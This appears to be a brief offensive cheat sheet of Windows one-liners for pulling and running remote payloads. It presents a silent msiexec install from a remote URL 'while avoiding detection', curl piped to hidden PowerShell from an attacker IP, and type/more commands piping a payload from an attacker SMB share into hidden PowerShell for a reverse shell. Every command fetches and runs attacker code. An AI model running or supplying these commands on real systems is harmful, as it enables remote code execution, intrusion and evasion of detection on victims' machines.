# Windowsx86 shelcode

1). Windows installer is used to install software or a patch, but we can take advantage of this built in windows tool to download and execute remote payload in the background while avoiding detection.
	
	Command-Line:  msiexec /i http://server/package.msi /qn

2). Windows 10 version 1803 (and earlier, with insider build 17063) includes a native curl.exe (and tar.exe ) in C:\Windows\System32\, which you can access right from your regular CMD.
	
	Command-Line: curl http://<attacker-ip>/<payload-name>.txt | powershell -w h

3). Some new ways of getting a reverse shell using windows one-liner:
	
	Command-Line: type \\<attacker-ip>\<payload-name>.txt | powershell -w h
	Command-Line: more \\<attacker-ip>\<payload-name>.txt | powershell -w h
